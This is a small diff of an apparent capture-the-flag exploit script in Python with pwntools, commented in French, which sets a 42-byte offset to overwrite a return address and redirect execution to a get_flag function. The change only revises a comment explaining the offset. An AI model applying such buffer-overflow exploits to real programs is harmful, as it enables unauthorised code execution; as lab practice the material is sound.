@@ -9,7 +9,7 @@ context.log_level = 'debug'
 # Adresse de la fonction get_flag (peut être obtenue via gdb ou objdump)
 get_flag_addr = elf.symbols['get_flag']
 
-# Offset pour écraser l'adresse de retour (64 pour le buffer + 8 pour le RBP)
+# Offset pour écraser l'adresse de retour (30 pour le buffer + 4 (?) + 8 pour le RBP)
 offset = 42
 
 # Payload pour rediriger l'exécution vers get_flag
